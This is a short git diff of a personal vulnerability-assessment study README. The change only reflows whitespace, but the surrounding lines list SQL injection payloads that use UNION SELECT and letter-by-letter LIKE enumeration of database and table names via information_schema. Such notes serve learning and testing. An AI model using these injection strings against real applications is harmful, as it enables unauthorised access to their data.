@@ -186,7 +186,7 @@ This repository documents my hands-on learning and notes in Vulnerability Assess
 		$ username UNION SELECT 1,2,3;-- (finding the path to the actual column)
   
 		$ username UNION SELECT 1,2,3 where database() like '%';-- (enumeration of the database)
-			--cycle all the keys on the keyboars in the "like" operator such as 'a%' then another time 'b%' until the string 				matches the first letter of the database name. After finding the first letter do it until we find the database full 			name.
+			--cycle all the keys on the keyboars in the "like" operator such as 'a%' then another time 'b%' until the string matches the first letter of the database name. After finding the first letter do it until we find the database full 			name.
   
 		$ username UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema = 'something' and table_name like 'a%';--  		(enumeration of table name)
 			-- using infromation_schema database to find the table name just like we found the databse name using "like" operator.
